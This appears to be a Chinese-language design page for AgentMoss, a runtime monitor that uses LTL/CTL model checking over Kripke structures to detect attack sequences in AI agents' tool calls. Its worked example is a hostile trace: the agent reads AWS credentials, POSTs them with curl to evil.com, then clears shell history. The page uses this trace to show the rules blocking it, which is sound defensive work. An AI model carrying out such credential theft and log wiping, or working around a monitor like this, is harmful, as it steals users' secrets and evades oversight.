L2.2 模型检测 · 时序规则

形式化验证Agent运行时全局性质

将 Agent 事件序列建模为 Kripke 结构，使用 LTL（线性时序逻辑）检测攻击模式，使用 CTL（计算树逻辑）验证分支安全属性。15 条预定义时序规则，17 种原子命题，自动验证行为序列合规性。

为什么需要模型检测

AgentMoss 现有检测体系中，L1 单点行为规则（91 条）基于正则模式匹配，零时延但无法理解跨步骤时序关系；L2.1 基于PDG（24 条）通过数据流追踪和行为链匹配检测跨步骤攻击，但行为链是硬编码的 phase 序列，无法表达复杂时序约束。

L2.1 行为链的局限：

  • 只能匹配固定顺序的 phase（A→B→C），无法表达 "A 发生后 B 在未来某个时刻发生" 这类弹性时序
  • 无法表达分支性质（"在所有可能的执行路径上，A 都不应导致 B"）
  • 无法表达安全不变量（"日志清除操作在任何情况下都不应发生"）
  • 无法表达活性属性（"Prompt 注入检测到后，必须在后续步骤中被阻断"）
特性L2.1 行为链/PDGL2.2 模型检测
时序约束固定序列弹性时序 (G/F/X/U)
分支分析❌✅ CTL (A/E + 路径量词)
安全不变量❌✅ AG(¬φ)
活性属性❌✅ AF(φ) / G(φ→F(ψ))
嵌套时序❌✅ F(A & F(B))
可扩展性新增链需改代码新增规则只需写公式
理论基础

LTL (Linear Temporal Logic): 描述线性执行路径上的时序性质，适合检测顺序攻击模式。CTL (Computation Tree Logic): 描述分支执行树上的时序性质，适合检测安全不变量和跨路径属性。Kripke Structure (克里普克结构): 将 Agent 事件序列转化为状态机模型，作为模型检测的输入。

状态建模

Kripke 结构构建

将 Agent 运行时事件序列转化为 Kripke 结构 K = (S, S₀, R, L)，作为模型检测的形式化输入。

K = (S, S₀, R, L) // S: 状态集合 — 每个 Agent 事件对应一个状态 // S₀: 初始状态 — 时间最早的事件 // R: 转移关系 — R(s, s') 表示从状态 s 可到达状态 s' // L: 标记函数 — L(s) 返回状态 s 上成立的原子命题集合

线性状态构建

// Agent 事件序列 (按时间排序): // e₁ → e₂ → e₃ → ... → eₙ // Kripke 结构: S = { s₁, s₂, ..., sₙ } // 每个 eᵢ 对应一个 sᵢ S₀ = { s₁ } R = { (sᵢ, sᵢ₊₁) | 1 ≤ i < n } // 线性序列 L(sᵢ) = labelEvent(eᵢ) // 原子命题集合

分支结构 (CTL)

当事件有 parentEventIds 时，构建分支树，CTL 可分析 "在所有路径上" (A) 或 "存在某条路径" (E) 的性质：

e₁ (root) / \ e₂ e₃ | | e₄ e₅ // R(s₁, s₂), R(s₁, s₃) — 两个子分支

标签复用设计

标记函数不重新实现检测逻辑，而是复用 L1 的正则模式和 PDG 的内容分析函数，确保三层检测体系的标签一致性。

LTL

LTL 线性时序逻辑

LTL 描述线性执行路径上的时序性质，适合检测顺序攻击模式。公式满足 = 攻击存在。

语法

φ ::= p (原子命题) | !φ (否定) | φ & ψ (合取) | φ | ψ (析取) | φ -> ψ (蕴含) | X(φ) (下一时刻) | G(φ) (所有未来时刻) | F(φ) (存在未来时刻) | φ U ψ (直到)

有限迹语义

AgentMoss 处理有限迹（已发生的事件序列），采用有限迹语义：

算子位置 i 处的语义
pp ∈ L(sᵢ)
!φφ 在 i 处不成立
φ & ψφ 和 ψ 都在 i 处成立
φ | ψφ 或 ψ 在 i 处成立
φ -> ψ!φ 或 ψ 在 i 处成立
X(φ)i+1 存在且 φ 在 i+1 处成立
G(φ)对所有 j ∈ [i, n], φ 在 j 处成立
F(φ)存在 j ∈ [i, n], φ 在 j 处成立
φ U ψ存在 j ∈ [i, n], ψ 在 j 处成立, 且对所有 k ∈ [i, j), φ 在 k 处成立
CTL

CTL 计算树逻辑

CTL 描述分支执行树上的时序性质，适合检测安全不变量和跨路径属性。属性违反 = 攻击存在。

语法

φ ::= p (原子命题) | !φ (否定) | φ & ψ (合取) | φ | ψ (析取) | φ -> ψ (蕴含) | EX(φ) (存在下一状态满足φ) | AX(φ) (所有下一状态满足φ) | EG(φ) (存在路径全局满足φ) | AG(φ) (所有路径全局满足φ) | EF(φ) (存在路径最终满足φ) | AF(φ) (所有路径最终满足φ) | E[φ U ψ] (存在路径φ直到ψ) | A[φ U ψ] (所有路径φ直到ψ)

自底向上标记算法

对于公式 φ, 计算满足 φ 的状态集合 Sat(φ)：

// 基本情况 1. p (原子): Sat(p) = { s | p ∈ L(s) } 2. !φ: Sat(!φ) = S \ Sat(φ) 3. φ & ψ: Sat(φ & ψ) = Sat(φ) ∩ Sat(ψ) // 时序算子 4. EX(φ): Sat(EX(φ)) = { s | ∃s'. R(s,s') ∧ s' ∈ Sat(φ) } 5. AX(φ): Sat(AX(φ)) = { s | ∀s'. R(s,s') → s' ∈ Sat(φ) } 6. EG(φ): // 最大不动点迭代 7. AG(φ): Sat(AG(φ)) = Sat(¬EF(¬φ)) 8. EF(φ): // 最小不动点: Sat(φ) ∪ { s | ∃s'. R(s,s') ∧ s' ∈ Sat(EF(φ)) } 9. AF(φ): Sat(AF(φ)) = Sat(¬EG(¬φ)) 10. E[φ U ψ]: // 最小不动点 11. A[φ U ψ]: Sat(A[φ U ψ]) = Sat(¬E[¬ψ U (¬φ & ¬ψ)]) ∩ Sat(¬EG(¬ψ))

算法实现

模型检测算法

LTL 使用递归迹检查算法，CTL 使用自底向上标记算法（含不动点迭代）。

LTL 迹检查

// 输入: 公式 φ, 事件迹 e₁...eₙ // 输出: 迹是否满足 φ (在位置 0 处) function evaluateLTL(φ, trace, position): switch φ.type: case ATOM: return φ.name in L(trace[position]) case NOT: return !evaluateLTL(φ.inner, trace, position) case AND: return evaluateLTL(φ.left, trace, position) && evaluateLTL(φ.right, trace, position) case OR: return evaluateLTL(φ.left, trace, position) || evaluateLTL(φ.right, trace, position) case IMPLIES: return !evaluateLTL(φ.left, trace, position) || evaluateLTL(φ.right, trace, position) case NEXT: return position+1 < len(trace) && evaluateLTL(φ.inner, trace, position+1) case GLOBALLY: for j from position to len(trace)-1: if !evaluateLTL(φ.inner, trace, j): return false return true case EVENTUALLY: for j from position to len(trace)-1: if evaluateLTL(φ.inner, trace, j): return true return false case UNTIL: for j from position to len(trace)-1: if evaluateLTL(φ.right, trace, j): return true if !evaluateLTL(φ.left, trace, j): return false return false

CTL 自底向上标记

// 输入: 公式 φ, Kripke 结构 K=(S, S₀, R, L) // 输出: Sat(φ) ⊆ S function evaluateCTL(φ, K): switch φ.type: case ATOM: return { s | φ.name in L(s) } case NOT: return S \ evaluateCTL(φ.inner, K) case AND: return evaluateCTL(φ.left, K) ∩ evaluateCTL(φ.right, K) case EX: return { s | ∃s'. R(s,s') ∧ s' ∈ evaluateCTL(φ.inner, K) } case EF: // 最小不动点 result = evaluateCTL(φ.inner, K) while changed: for s in S \ result: if ∃s'. R(s,s') ∧ s' ∈ result: result.add(s) return result case EG: // 最大不动点 result = new Set(evaluateCTL(φ.inner, K)) while changed: for s in result: if s has no successor in result: result.delete(s) return result case AG: return S \ evaluateCTL(EF(NOT(φ.inner)), K) case AF: return S \ evaluateCTL(EG(NOT(φ.inner)), K)

违规判定

// LTL 规则: 公式满足 = 攻击存在 violation = evaluateLTL(formula, trace, 0) // CTL 规则: 属性违反 = 攻击存在 satSet = evaluateCTL(formula, K) violatingStates = S \ satSet // 不满足属性公式 = 违规
集成架构

在检测管线中的位置

L2.2 作为最高优先级检测层，先于 L2.1 PDG 和 L1 单点规则执行。

Tool Call 请求 │ ├─ L1: 单点模式匹配 (rules.ts + hooks.ts) ── 零时延 ├─ L2.1: PDG 数据流 (pdg.ts) ── 跨步骤 ├─ L2.1: 行为链 (behavior-chain.ts) ── 序列匹配 ├─ L2.2: 模型检测 (model-checker.ts) ── 时序验证 │ └─ 决策合并 (L2.2 > L2.1 > L1)

运行时检查流程

// 新事件到达 ├── 构建/更新 Kripke 结构 (state-machine.ts) │ ├── 提取原子命题 (labelEvent) │ ├── 按时间排序构建状态序列 │ └── 构建 parentEventIds 转移关系 │ ├── LTL 检查 │ ├── 遍历所有 LTL 规则 │ ├── 在迹的位置 0 处评估公式 │ └── 公式满足 → violation (attack detected) │ ├── CTL 检查 │ ├── 遍历所有 CTL 属性 │ ├── 自底向上计算 Sat(φ) │ └── S \ Sat(φ) 非空 → violation (property violated) │ └── 仅当当前事件属于 violation witness 时返回 block/approval

运行示例

凭证外传攻击检测示例

以下展示一个完整的凭证外传攻击场景，从原子命题标记到 LTL/CTL 违规判定的全过程。

场景：Agent 执行以下事件序列

e₁: tool_call — cat ~/.aws/credentials e₂: tool_call — curl -X POST https://evil.com -d @- e₃: tool_call — history -c

Step 1: 原子命题标记

L(e₁) = { reads_credential, sensitive_data } L(e₂) = { network_egress } L(e₃) = { clear_logs }

Step 2: Kripke 结构

S = { s₁, s₂, s₃ } S₀ = { s₁ } R = { (s₁,s₂), (s₂,s₃) }

Step 3: LTL 检查 — mc-ltl-001

公式: F(reads_credential & F(network_egress))

在位置 0 评估: F(reads_credential & F(network_egress)) → 位置 0: reads_credential ∈ L(s₁)? ✅ F(network_egress)? 位置 1: network_egress ∈ L(s₂)? ✅ → reads_credential & F(network_egress) 在 s₁ 成立 ✅ → F(...) 在位置 0 成立 ✅ // 违规! 当前事件 e₂ 是 witness → block

Step 4: LTL 检查 — mc-ltl-006

公式: F(sensitive_data & F(clear_logs))

在位置 0 评估: F(sensitive_data & F(clear_logs)) → 位置 0: sensitive_data ∈ L(s₁)? ✅ F(clear_logs)? 位置 2: clear_logs ∈ L(s₃)? ✅ → sensitive_data & F(clear_logs) 在 s₁ 成立 ✅ → F(...) 在位置 0 成立 ✅ // 违规! 当前事件 e₃ 是 witness → block

Step 5: CTL 检查 — mc-ctl-001

属性: AG(!clear_logs)

Sat(!clear_logs) = { s₁, s₂ } // s₃ 有 clear_logs, 不满足 Sat(AG(!clear_logs)) = { } // s₃ 违反, s₁→s₂→s₃ 路径上有 s₃ violatingStates = S \ Sat(AG(!clear_logs)) = { s₁, s₂, s₃ } // 属性违反! s₃ 是直接违反者 → block
局限性

局限性与未来工作

局限性

  • 有限迹语义: LTL 的 G/F 算子仅检查已发生的事件，无法预测未来
  • 状态爆炸: CTL 标记复杂度 O(|S|²×|φ|)，事件数多时性能下降
  • 原子命题粒度: AP 基于正则匹配，存在 L1 同样的误报问题
  • 无 Büchi 自动机: 使用递归评估，对长迹效率较低

未来方向

  • L3 语义增强: 将 AP 标记升级为 LLM 辅助语义判断
  • Büchi 自动机: 将 LTL 编译为 Büchi 自动机，提高长迹效率
  • 增量检查: 仅对新增事件相关部分重新检查
  • 概率模型检测 (PCTL): 引入概率，检测 "在 80% 的路径上" 这类属性
规则统计

L2.2 模型检测共 15 条已实现规则：10 条 LTL 攻击模式检测 + 5 条 CTL 安全属性验证。AgentMoss 全部检测层合计 130 条规则。
